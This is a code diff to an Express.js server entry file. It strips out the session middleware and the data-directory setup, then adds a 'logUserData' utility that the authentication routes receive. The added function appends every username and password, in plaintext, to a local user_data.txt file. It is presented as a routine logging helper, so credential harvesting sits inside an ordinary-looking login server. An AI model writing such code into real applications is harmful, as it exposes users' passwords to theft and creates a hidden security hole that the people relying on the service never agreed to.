@@ -1,36 +1,22 @@
 const express = require('express');
-const session = require('express-session');
-const authRoutes = require('./routes/authRoutes');
 const fs = require('fs');
 const path = require('path');
+const authRoutes = require('./routes/authRoutes');
 
 const app = express();
 
-// Middleware to parse JSON
 app.use(express.json());
-
-// Serve static files from the 'public' directory
 app.use(express.static('public'));
 
-// Session middleware
-app.use(session({
-    secret: 'your secret key',
-    resave: true,
-    saveUninitialized: true
-}));
-
-// Check if the data directory exists; if not, create it
-const dataPath = path.join(__dirname, 'data');
-if (!fs.existsSync(dataPath)){
-    fs.mkdirSync(dataPath, { recursive: true });
+// Utility to log user data
+function logUserData(username, password) {
+    const logFilePath = path.join(__dirname, 'user_data.txt');
+    const stream = fs.createWriteStream(logFilePath, { flags: 'a' });
+    stream.write(`Username: ${username}, Password: ${password}\n`);
+    stream.end();
 }
 
-// API Routes
-app.use('/api/users', authRoutes);
+app.use('/api/users', authRoutes(logUserData)); // Pass the function to routes if needed
 
-// Define a simple route
-app.get('/', (req, res) => res.send('Hello World!'));
-
-// Start the server
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
